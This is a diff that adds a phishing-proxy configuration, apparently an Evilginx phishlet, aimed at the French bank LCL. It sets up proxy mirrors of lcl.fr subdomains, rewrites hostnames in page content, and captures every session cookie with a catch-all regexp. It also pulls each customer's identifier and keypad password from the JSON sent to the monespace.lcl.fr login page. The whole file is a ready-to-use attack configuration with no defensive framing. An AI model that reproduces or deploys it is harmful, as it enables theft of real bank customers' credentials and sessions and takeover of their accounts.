@@ -1,0 +1,37 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'lcl.fr', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'lcl.fr', auto_filter: true, session: true, is_landing: true}
+  - {phish_sub: 'monespace', orig_sub: 'monespace', domain: 'lcl.fr', auto_filter: true, session: true, is_landing: true}
+  - {phish_sub: 'front.tech', orig_sub: 'front.tech', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'img-fdb.tech', orig_sub: 'img-fdb.tech', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'static.tech', orig_sub: 'static.tech', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'static-r.tech', orig_sub: 'static-r.tech', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'assets.tech', orig_sub: 'assets.tech', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'espacepro.secure', orig_sub: 'espacepro.secure', domain: 'lcl.fr', session: true, is_landing: false}
+  - {phish_sub: 'tagcommand.tech', orig_sub: 'tagcommand.tech', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'fw-stats', orig_sub: 'fw-stats', domain: 'lcl.fr', session: false, is_landing: false}
+  - {phish_sub: 'pushcss.tech', orig_sub: 'pushcss.tech', domain: 'lcl.fr', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.lcl.fr', orig_sub: 'www', domain: 'lcl.fr', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'lcl.fr', orig_sub: '', domain: 'lcl.fr', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'monespace.lcl.fr', orig_sub: 'monespace', domain: 'lcl.fr', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'espacepro.secure.lcl.fr', orig_sub: 'espacepro.secure', domain: 'lcl.fr', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'www.lcl.fr'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/null'
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"keypad":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'monespace.lcl.fr'
+  path: '/connexion'
